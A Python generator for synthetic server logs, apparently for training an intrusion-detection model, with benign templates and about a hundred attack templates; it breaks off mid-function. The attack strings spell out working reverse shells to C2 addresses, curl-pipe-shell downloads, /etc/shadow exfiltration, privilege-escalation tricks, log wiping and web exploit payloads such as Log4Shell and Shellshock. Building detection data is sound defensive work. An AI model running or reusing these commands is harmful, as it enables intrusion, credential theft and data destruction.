# File: src/dataset.py
# Description: Scalable Enterprise Log Dataset Generator (1,000,000 Samples with 150 Templates)

import random
import pandas as pd

class MillionLogDatasetGenerator:
    def __init__(self):
        self.dates = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
        self.hosts = [f"srv{i:02d}" for i in range(1, 100)]
        self.users = ["user1", "app", "postgres", "ubuntu", "dev", "ansible", "deploy", "sysadmin", "oracle", "jenkins", "runner", "developer", "sysops"]
        self.web_paths = ["/index.php", "/api/v1/data", "/static/css/main.css", "/login", "/healthz", "/metrics", "/v1/auth", "/dashboard"]
        self.c2_ips = ["194.26.29.112", "45.142.214.12", "185.220.101.5", "10.0.0.99", "192.168.1.200"]

    def _random_dt(self):
        return f"{random.choice(self.dates)} {random.randint(1,28):02d} {random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}"

    def _random_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _get_templates(self, dt, h, user, ip, c2_ip, pid):
        # ======================================================================
        # 150 TEMPLATE LİSTESİ (75 MEŞRU + 75 SALDIRI / ANOMALİ)
        # ======================================================================
        
        safe_templates = [
    # --- Systemd, Kernel & System Events (1-20) ---
    f"{dt} {h} systemd[{pid}]: Started Session {random.randint(1,5000)} of user {user}.",
    f"{dt} {h} systemd[{pid}]: Starting Daily Cleanup of Temporary Directories...",
    f"{dt} {h} systemd-logind[{pid}]: New session {random.randint(100,900)} of user {user}.",
    f"{dt} {h} systemd[{pid}]: Reached target Network is Online.",
    f"{dt} {h} systemd[{pid}]: Created slice User Slice of user {user}.",
    f"{dt} {h} systemd[{pid}]: Starting Rotate log files...",
    f"{dt} {h} systemd[{pid}]: Started Daily apt download activities.",
    f"{dt} {h} systemd[{pid}]: Reached target Graphical Interface.",
    f"{dt} {h} systemd[{pid}]: Reached target System Initialization.",
    f"{dt} {h} systemd[{pid}]: Started Periodic Command Scheduler.",
    f"{dt} {h} systemd[{pid}]: Stopping User Manager for UID {random.randint(1000,2000)}...",
    f"{dt} {h} systemd-resolved[{pid}]: Clock synchronized to server {ip}.",
    f"{dt} {h} systemd-timesyncd[{pid}]: Synchronized to time server {ip}:123.",
    f"{dt} {h} kernel: [{random.uniform(10, 1000):.6f}] usb 1-1: New USB device found, idVendor=0781, idProduct=5581",
    f"{dt} {h} kernel: [{random.uniform(1000, 5000):.6f}] EXT4-fs (sda1): re-mounted. Opts: errors=remount-ro",
    f"{dt} {h} kernel: [{random.uniform(500, 2000):.6f}] TCP: cubic registered",
    f"{dt} {h} kernel: [{random.uniform(2000, 6000):.6f}] eth0: Link is Up 1000 Mbps Full Duplex",
    f"{dt} {h} kernel: [{random.uniform(3000, 8000):.6f}] USB disconnect, device number {random.randint(1,10)}",
    f"{dt} {h} NetworkManager[{pid}]: <info> dhcp4 (eth0): state changed bound to {ip}",
    f"{dt} {h} networkd-dispatcher[{pid}]: Re-configuring network interfaces...",

    # --- SSHD, Login & Authentication (21-35) ---
    f"{dt} {h} sshd[{pid}]: Accepted password for {user} from {ip} port {random.randint(1024,65535)} ssh2",
    f"{dt} {h} sshd[{pid}]: Accepted publickey for {user} from {ip} port {random.randint(1024,65535)} ssh2: RSA SHA256:{random.getrandbits(64):x}",
    f"{dt} {h} sshd[{pid}]: Received disconnect from {ip} port {random.randint(1024,65535)}:11: disconnected by user",
    f"{dt} {h} systemd-logind[{pid}]: Session {random.randint(100,900)} logged out. Waiting for processes to exit.",
    f"{dt} {h} sudo: {user} : TTY=pts/0 ; PWD=/etc/ssl ; USER=root ; COMMAND=/usr/bin/openssl x509 -in cert.pem -text -noout",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/etc/ssl/private ; USER=root ; COMMAND=/usr/bin/openssl rsa -in server.key -check -noout",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/zcat auth.log.2.gz | grep \"Failed\"",
    f"{dt} {h} sudo: operator : TTY=pts/1 ; PWD=/etc ; USER=root ; COMMAND=/usr/bin/cat /etc/hosts",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/error.log",
    f"{dt} {h} sudo: sysadmin : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/grep -rn \"SELECT\" /var/log/mysql/query.log",
    f"{dt} {h} sudo: sysops : TTY=pts/2 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/head -n 50 access.log",
    f"{dt} {h} sudo: operator : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/head -n 20 syslog",
    f"{dt} {h} sudo: sysops : TTY=pts/2 ; PWD=/var/log/apache2 ; USER=root ; COMMAND=/usr/bin/grep -i \"error\" error.log",
    f"{dt} {h} sudo: operator : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/zgrep -i \"error\" /var/log/syslog.2.gz",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/uptime",

    # --- Cron & Scheduled Maintenance Jobs (36-50) ---
    f"{dt} {h} CRON[{pid}]: (root) CMD (test -x /usr/sbin/anacron || {{ cd / && run-parts --report /etc/cron.daily; }})",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (pg_dump -U postgres -d production_db -c \"VACUUM FULL ANALYZE;\")",
    f"{dt} {h} CRON[{pid}]: (root) CMD (/usr/bin/python3 /opt/monitoring/health_check.py > /dev/null 2>&1)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (test -x /usr/bin/certbot && certbot -q renew)",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (vacuumdb --all --analyze-only)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (/usr/bin/rsync -az /var/www/ /mnt/backup/www/)",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (pg_dumpall | gzip > /var/backups/db_$(date +%Y%m%d).sql.gz)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (run-parts /etc/cron.hourly)",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (pg_dump dbname > /tmp/backup.sql)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (python3 /usr/local/bin/log_analyzer.py)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (/usr/local/bin/backup_s3.sh > /dev/null 2>&1)",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (vacuumdb -d appdb -z)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (/usr/local/bin/check_disk_space.sh)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (/usr/bin/certbot renew --quiet)",
    f"{dt} {h} CRON[{pid}]: (postgres) CMD (pg_dumpall -U postgres | gzip > /var/backups/pg_dump.gz)",

    # --- DevOps, CI/CD, Docker & Kubernetes (51-68) ---
    f"{dt} {h} dockerd[{pid}]: msg=\"Executing container health check\" container={random.randint(1000,9999):x}",
    f"{dt} {h} dockerd[{pid}]: msg=\"Container exec started\" container={random.randint(1000,9999):x} cmd=\"python3 manage.py migrate\"",
    f"{dt} {h} dockerd[{pid}]: msg=\"Health check passed\" container={random.randint(1000,9999):x}",
    f"{dt} {h} dockerd[{pid}]: msg=\"Container stopped\" container={random.randint(1000,9999):x}",
    f"{dt} {h} kubelet[{pid}]: I{random.randint(100,999)} {dt}.{random.randint(100,999)} {pid} pod_workers.go:1200] Syncing pod \"redis-cache-{random.randint(100,999)}\"",
    f"{dt} {h} kubelet[{pid}]: I{random.randint(100,999)} {dt}.{random.randint(100,999)} {pid} status_manager.go:610] Syncing pod status for \"frontend-{random.randint(100,999)}\"",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/app ; USER=root ; COMMAND=/usr/bin/docker exec -it container_id /bin/sh -c \"python3 manage.py check\"",
    f"{dt} {h} sudo: devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/kubectl get pods -A",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/helm list -A",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/docker compose ps",
    f"{dt} {h} sudo: devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/kubectl logs -n default -l app=frontend",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/sbin/nginx -s reload",
    f"{dt} {h} sudo: devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/find /var/log -type f -name \"*.log\"",
    f"{dt} {h} sudo: runner : TTY=unknown ; PWD=/build ; USER=root ; COMMAND=/usr/bin/docker build -t app:latest .",
    f"{dt} {h} gitlab-runner[{pid}]: Job {random.randint(10000,99999)} succeeded for commit {random.getrandbits(32):x}",
    f"{dt} {h} sudo: developer : TTY=pts/1 ; PWD=/app ; USER=root ; COMMAND=/usr/bin/pip install -r requirements.txt",
    f"{dt} {h} sudo: developer : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/git pull origin release-v2.1",
    f"{dt} {h} sudo: developer : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/git pull origin main",

    # --- System Administration & Infrastructure (69-85) ---
    f"{dt} {h} sudo: sysadmin : TTY=pts/2 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=2d",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/etc/systemd ; USER=root ; COMMAND=/usr/bin/systemctl reload rsyslog",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tcpdump -i eth0 -c 100 -w /tmp/capture.pcap",
    f"{dt} {h} sudo: sysadmin : TTY=pts/2 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/strace -f -p 1024",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/etc/systemd ; USER=root ; COMMAND=/usr/bin/systemctl daemon-reload",
    f"{dt} {h} sudo: sysadmin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx.service --since \"1 hour ago\"",
    f"{dt} {h} sudo: sysops : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/htop",
    f"{dt} {h} sudo: sysops : TTY=pts/1 ; PWD=/var/log/app ; USER=root ; COMMAND=/usr/bin/find /var/log/app/ -name \"*.tmp\" -exec rm -f {{}} +",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/sbin/nginx -t",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart docker",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/etc/ufw ; USER=root ; COMMAND=/usr/bin/ufw status verbose",
    f"{dt} {h} sudo: admin : TTY=pts/0 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/nginx -t",
    f"{dt} {h} sudo: app : TTY=pts/0 ; PWD=/app ; USER=root ; COMMAND=/bin/journalctl -u myapp.service -n 50",
    f"{dt} {h} sudo: appadmin : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart gunicorn",
    f"{dt} {h} sudo: ansible : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c \"echo 'net.core.somaxconn=1024' >> /etc/sysctl.conf && sysctl -p\"",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/opt/deploy ; USER=root ; COMMAND=/usr/bin/python3 -c \"import base64; print(base64.b64encode(b'config_data'))\"",
    f"{dt} {h} sudo: devops : TTY=pts/1 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/iptables -L -n -v",

    # --- Web Traffic, Static Assets & APIs (86-100) ---
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET {random.choice(self.web_paths)} HTTP/1.1\" 200 {random.randint(200,5000)}",
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET /static/css/main.css HTTP/1.1\" 200 4520",
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET /search?q=select+id,name+from+products+where+category%3D%27books%27 HTTP/1.1\" 200 1420",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"POST /api/v1/telemetry HTTP/1.1\" 200 {random.randint(100,1000)}",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"GET /favicon.ico HTTP/1.1\" 304 0",
    f"{dt} {h} ufw[{pid}]: [UFW ALLOW] IN=eth0 OUT= SRC={ip} DST=10.0.0.5 PROTO=TCP SPT={random.randint(1024,65535)} DPT=443",
    f"{dt} {h} ufw[{pid}]: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.25 DST=10.0.0.1 PROTO=TCP SPT=53210 DPT=22",
    f"{dt} {h} ufw[{pid}]: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.100 DST=10.0.0.5 PROTO=TCP SPT=443 DPT=51234",
    f"{dt} {h} ufw[{pid}]: [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.5 DST=10.0.0.1 PROTO=TCP SPT=61200 DPT=22",
    f"{dt} {h} certbot[{pid}]: Renewal configuration file /etc/letsencrypt/renewal/site.conf is valid.",
    f"{dt} {h} dpkg[{pid}]: status installed libssl-dev:amd64 3.0.2-0ubuntu1.10",
    f"{dt} {h} dpkg[{pid}]: status installed curl:amd64 7.81.0-1ubuntu1.10",
    f"{dt} {h} dpkg[{pid}]: status installed ufw:amd64 0.36.1-4ubuntu0.1",
    f"{dt} {h} dpkg[{pid}]: status installed unzip:amd64 6.0-26ubuntu3.1",
    f"{dt} {h} packagekitd[{pid}]: Request process transaction completed.",
    f"{dt} {h} packagekitd[{pid}]: Transaction active, percentage: 80",
    f"{dt} {h} prometheus[{pid}]: level=info ts={dt}.000Z msg=\"Scrape loop completed\" duration=12.4ms",
    f"{dt} {h} prometheus[{pid}]: level=info ts={dt}.001Z caller=head.go:810 msg=\"WAL segment loaded\"",
    f"{dt} {h} rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2112.0\"] action 'action-1-builtin:omfile' resumed",
    f"{dt} {h} rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2112.0\"] HUPed",
    f"{dt} {h} snapd[{pid}]: Store checking for updates.",
    f"{dt} {h} snapd[{pid}]: auto-connect.go:210: auto-connect connected plug core:homedir to slot core:homedir",
    f"{dt} {h} postfix/smtpd[{pid}]: connect from unknown[{ip}]",
    f"{dt} {h} auditd[{pid}]: Audit daemon status: processing=0, total=120, system_free=85%"
]

        # src/dataset.py içindeki attack_templates listesinin genişletilmiş sürümü

        attack_templates = [
    # --- Brute Force, Unlawful Access & Persistence (1-15) ---
    f"{dt} {h} sshd[{pid}]: Failed password for invalid user root from {ip} port {random.randint(1024,65535)} ssh2",
    f"{dt} {h} sshd[{pid}]: Failed password for root from {ip} port {random.randint(1024,65535)} ssh2",
    f"{dt} {h} sshd[{pid}]: Failed password for invalid user oracle from {ip} port {random.randint(1024,65535)} ssh2",
    f"{dt} {h} bash[{pid}]: Executed: echo \"devuser ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers",
    f"{dt} {h} bash[{pid}]: Executed: echo \"auth optional pam_exec.so expose_authtok /tmp/steal.sh\" >> /etc/pam.d/common-auth",
    f"{dt} {h} bash[{pid}]: Executed: echo \"root:{random.randint(100000,999999)}\" | chpasswd",
    f"{dt} {h} bash[{pid}]: Executed: echo \"root:$6$salt$hashedpassword\" | chpasswd -e",
    f"{dt} {h} bash[{pid}]: Executed: echo \"root:p@ssw0rd123!\" | chpasswd",
    f"{dt} {h} bash[{pid}]: Executed: echo \"export LD_PRELOAD=/tmp/evil.so\" >> ~/.bashrc",
    f"{dt} {h} bash[{pid}]: Executed: echo \"alias ls='nc -e /bin/bash {c2_ip} 4444 & ls'\" >> /etc/bash.bashrc",
    f"{dt} {h} bash[{pid}]: Executed: echo \"* * * * * root /tmp/.x >/dev/null 2>&1\" >> /etc/crontab",
    f"{dt} {h} bash[{pid}]: Executed: echo \"* * * * * root /tmp/.x >/dev/null 2>&1\" > /etc/cron.d/malicious_job",
    f"{dt} {h} bash[{pid}]: Executed: touch -r /etc/passwd /tmp/.backdoor_timestamp",
    f"{dt} {h} bash[{pid}]: Executed: touch -r /bin/login /tmp/.hidden_door",
    f"{dt} {h} bash[{pid}]: Executed: export HISTFILE=/dev/null && unset HISTFILE",

    # --- Reverse Shells, Interactive Shells & C2 Tunnels (16-35) ---
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2_ip}\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"]);')",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{c2_ip}\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")')",
    f"{dt} {h} bash[{pid}]: Executed: python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{c2_ip}\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    f"{dt} {h} bash[{pid}]: Executed: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2_ip} 4444 >/tmp/f",
    f"{dt} {h} bash[{pid}]: Executed: ncat -e /bin/bash {c2_ip} 4444",
    f"{dt} {h} CRON[{pid}]: (root) CMD (nc -e /bin/sh {c2_ip} 4444)",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (curl -fsSL http://{c2_ip}/sh | sh)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (wget -qO- http://{c2_ip}/setup.sh | perl)",
    f"{dt} {h} CRON[{pid}]: (root) CMD (curl -s http://evil.com/miner | sh)",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-connect:{c2_ip}:4444)",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (dash -c 'exec 5<>/dev/tcp/{c2_ip}/4444;cat <&5 | while read line; do $line 2>&5 >&5; done')",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{c2_ip}:4444\");STDIN->fdopen($c,r);system$_ while<>;')",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (php -r '$s=fsockopen(\"{c2_ip}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");')",
    f"{dt} {h} CRON[{pid}]: (root) CMD (tftp -g -r miner {c2_ip} && chmod +x miner && ./miner)",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (ruby -rsocket -e 'c=TCPSocket.new(\"{c2_ip}\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end')",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (expect -c 'spawn /bin/sh; interact')",
    f"{dt} {h} bash[{pid}]: Executed: node -e 'require(\"child_process\").exec(\"nc -e /bin/sh {c2_ip} 4444\")'",
    f"{dt} {h} bash[{pid}]: Executed: lua -e 'os.execute(\"/bin/sh -i\")'",
    f"{dt} {h} bash[{pid}]: Executed: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    f"{dt} {h} sudo: www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",

    # --- GTFOBins & Privilege Escalation (36-60) ---
    f"{dt} {h} sudo: www-data : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/tar -cf /dev/null /tmp --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -i \\;",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/find . -execdir /bin/sh \\; -quit",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/awk 'BEGIN {{system(\"/bin/sh\")}}'",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/awk -f /tmp/evil.awk /etc/passwd",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/vim -c ':!/bin/sh'",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/git -c core.pager='exec /bin/sh' help",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/env /bin/sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/env /bin/bash",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/sed -n '1e exec /bin/sh' /etc/hosts",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/nano -s /bin/sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/man -P /bin/sh ls",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/zip /tmp/test.zip /etc/passwd -T -TT '/bin/sh -c id#'",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/timeout 10d /bin/sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/run-parts --arg=/bin/sh /tmp",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/stdbuf -i0 -o0 /bin/sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/xargs -a /dev/null sh",
    f"{dt} {h} sudo: www-data : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/flock -u / /bin/sh",
    f"{dt} {h} sudo: www-data : TTY=unknown ; USER=root ; COMMAND=/usr/bin/chmod +s /bin/bash",
    f"{dt} {h} bash[{pid}]: Executed: chmod 4755 /bin/dash",
    f"{dt} {h} bash[{pid}]: Executed: cp /bin/dash /tmp/.identity && chmod 4777 /tmp/.identity",
    f"{dt} {h} bash[{pid}]: Executed: cp /bin/bash /tmp/.b && chmod u+s /tmp/.b",
    f"{dt} {h} bash[{pid}]: Executed: cp /bin/sh /tmp/.sh && chmod u+s /tmp/.sh",
    f"{dt} {h} bash[{pid}]: Executed: python3 -c 'import os; os.setresuid(0,0,0); os.execl(\"/bin/bash\", \"bash\")'",

    # --- Obfuscation, Encoding & Evading Lexers (61-80) ---
    f"{dt} {h} bash[{pid}]: Executed: /b'i'n/b'a's'h -c \"cat /etc/shadow > /dev/tcp/{c2_ip}/4444\"",
    f"{dt} {h} bash[{pid}]: Executed: bash -c \"$'\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68' -i >& /dev/tcp/{c2_ip}/4444 0>&1\"",
    f"{dt} {h} bash[{pid}]: Executed: /???/b*sh -c \"cat /etc/sha* > /dev/tcp/{c2_ip}/4444\"",
    f"{dt} {h} bash[{pid}]: Executed: u=${{PATH:0:1}}; ${{u}}bin${{u}}bash -i >& /dev/tcp/{c2_ip}/4444 0>&1",
    f"{dt} {h} bash[{pid}]: Executed: IFS=,;cmd=cat,/etc/shadow;$cmd",
    f"{dt} {h} bash[{pid}]: Executed: base64 -d <<< \"Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=\" | sh",
    f"{dt} {h} bash[{pid}]: Executed: echo \"c2hhcGhpbmcgaGFja2VkYmFzaA==\" | base64 -d | sh",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (python3 -c \"import base64,exec;exec(base64.b64decode('aW1wb3J0IG9z...'))\")",
    f"{dt} {h} bash[{pid}]: Executed: python3 -c \"import bytes;exec(bytes.fromhex('696d706f7274206f73').decode())\"",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (nohup python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://{c2_ip}/s\").read())' &)",
    f"{dt} {h} CRON[{pid}]: (www-data) CMD (python3 -c 'import urllib.request,os;exec(urllib.request.urlopen(\"http://{c2_ip}/payload\").read())')",
    f"{dt} {h} bash[{pid}]: Executed: openssl s_client -quiet -connect {c2_ip}:4433 | /bin/bash | openssl s_client -quiet -connect {c2_ip}:4434",
    f"{dt} {h} bash[{pid}]: Executed: iptables -I INPUT -p tcp --dport 22 -j ACCEPT && iptables -F",
    f"{dt} {h} bash[{pid}]: Executed: find / -perm -4000 -type f 2>/dev/null > /tmp/.suid_list",
    f"{dt} {h} bash[{pid}]: Executed: echo \"auto eth0:1\\niface eth0:1 inet static\\naddress 10.0.0.250\" >> /etc/network/interfaces",
    f"{dt} {h} bash[{pid}]: Executed: chmod 777 /etc/passwd",
    f"{dt} {h} bash[{pid}]: Executed: /usr/bin/env -i PATH=/bin:/usr/bin /bin/bash -c \"exec 5<>/dev/tcp/{c2_ip}/4444;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"",
    f"{dt} {h} sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -i \\;",
    f"{dt} {h} sudo: www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/vim -c ':!/bin/sh'",
    f"{dt} {h} sudo: www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/flock -u / /bin/sh",

    # --- Data Exfiltration, Clearing Logs & Web Attacks (81-100) ---
    f"{dt} {h} bash[{pid}]: Executed: for i in $(cat /etc/shadow | xxd -p); do dig +short $i.attacker.com; done",
    f"{dt} {h} bash[{pid}]: Executed: dig +short $(cat /etc/passwd | base64 | tr -d '\\n').attacker.com",
    f"{dt} {h} bash[{pid}]: Executed: tar -cf - /etc/shadow | nc -w 3 {c2_ip} 9999",
    f"{dt} {h} bash[{pid}]: Executed: tar -cvf - /etc/shadow | nc {c2_ip} 4444",
    f"{dt} {h} bash[{pid}]: Executed: cat /etc/shadow | nc {c2_ip} 4444",
    f"{dt} {h} bash[{pid}]: Executed: curl -F \"file=@/etc/passwd\" http://{c2_ip}/upload",
    f"{dt} {h} bash[{pid}]: Executed: rm -f /var/log/auth.log && ln -s /dev/null /var/log/auth.log",
    f"{dt} {h} bash[{pid}]: Executed: history -c && rm -f ~/.bash_history",
    f"{dt} {h} bash[{pid}]: Executed: history -c && history -w && rm -f ~/.bash_history",
    f"{dt} {h} bash[{pid}]: Executed: dd if=/dev/urandom of=/dev/sda bs=1M count=10",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfifo HTTP/1.1\" 200 450",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"POST /api/v1/upload?file=../../../../tmp/shell.php HTTP/1.1\" 200 890",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"GET /solr/admin/cores?action=CREATE&name=${{jndi:ldap://{c2_ip}/a}} HTTP/1.1\" 200 120",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"GET /cgi-bin/vulnerable.cgi HTTP/1.1\" 200 150 \"|\" \"() {{ :;}}; /bin/bash -c 'nc -e /bin/bash {c2_ip} 4444'\"",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\" 200 120",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"POST /cgi-bin/test-cgi HTTP/1.1\" 200 450 \"|\" \"() {{ :; }}; /bin/bash -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2_ip} 4444 >/tmp/f'\"",
    f"{dt} {h} apache2[{pid}]: {ip} - - [{dt} +0300] \"POST /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1\" 200 1024",
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET /vulnerability/file_inclusion.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1\" 200 2048",
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET /index.php?s=/api/index/m=index&a=index&data=system('id') HTTP/1.1\" 200 120",
    f"{dt} {h} nginx[{pid}]: {ip} - - [{dt} +0300] \"GET /?user=%27%20UNION%20SELECT%201,2,load_file(%27/etc/passwd%27)--%20 HTTP/1.1\" 200 512"
]

        return safe_templates, attack_templates

    def build_dataset(self, n_samples=500000):
        print(f"📦 {n_samples:,} adet yüksek kaliteli sentetik log verisi bellek optimize şekilde üretiliyor...")
        logs = []
        labels = []
        
        # Batch üretimi ile bellek ve CPU yükünü dengeler
        batch_size = 10000
        for _ in range(0, n_samples, batch_size):
            for _ in range(batch_size // 2):
                dt = self._random_dt()
